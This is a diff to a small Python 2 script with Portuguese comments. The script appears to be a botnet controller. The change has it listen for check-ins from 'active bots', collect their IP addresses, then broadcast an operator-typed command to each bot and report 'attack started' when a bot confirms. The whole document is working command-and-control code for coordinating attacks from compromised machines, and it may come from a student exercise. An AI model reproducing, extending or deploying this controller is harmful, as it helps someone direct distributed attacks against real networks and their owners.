@@ -1,21 +1,42 @@
 from socket import *
 
-serverNameList = ['',"192.168.1.97","192.168.1.11"]
+serverNameList = []
 serverPort = 11750
+serverPortSubscription = 11749
 
-command = raw_input('Insira o comando para envio ao bots:')
-
-for serverName in serverNameList:
+#recebendo ips de bots ativos nas maquinas
+print "Recebendo ips dos bots ativos..."
+serverSocket = socket(AF_INET,SOCK_STREAM)
+serverSocket.bind(('',serverPortSubscription))
+serverSocket.listen(1)
+serverSocket.settimeout(8)
+firstTimeout = False
+while (firstTimeout == False):
     try:
-        clientSocket = socket(AF_INET, SOCK_STREAM)
-        clientSocket.settimeout(5)
-        clientSocket.connect((serverName,serverPort))
-        clientSocket.send(command)
-        modifiedSentence = clientSocket.recv(1024)
-        if modifiedSentence == "Confirmed":
-            print 'Ataque iniciado por ' + serverName
-        else:
-            print "Comando invalido"
-        clientSocket.close()
+        connectionSocket, addr = serverSocket.accept()
+        subscriptionConfirmation = connectionSocket.recv(1024)
+        serverNameList.append(addr[0])
     except error, exc:
-        print "Nao foi possivel conectar com " + serverName
+        print "Lista de ips dos bots ativos obtida:"
+        print serverNameList
+        firstTimeout = True
+
+if len(serverNameList) > 0:
+    #envia um comando para todos os bots na lista de ips obtidos
+    command = raw_input('Insira o comando para envio ao bots:')
+    for serverName in serverNameList:
+        try:
+            clientSocket = socket(AF_INET, SOCK_STREAM)
+            clientSocket.settimeout(8)
+            clientSocket.connect((serverName,serverPort))
+            clientSocket.send(command)
+            modifiedSentence = clientSocket.recv(1024)
+            if modifiedSentence == "Confirmed":
+                print 'Ataque iniciado por ' + serverName
+            else:
+                print "Comando invalido"
+            clientSocket.close()
+        except error, exc:
+            print "Nao foi possivel conectar com " + serverName
+else:
+    print "nenhum bot ativo na rede"
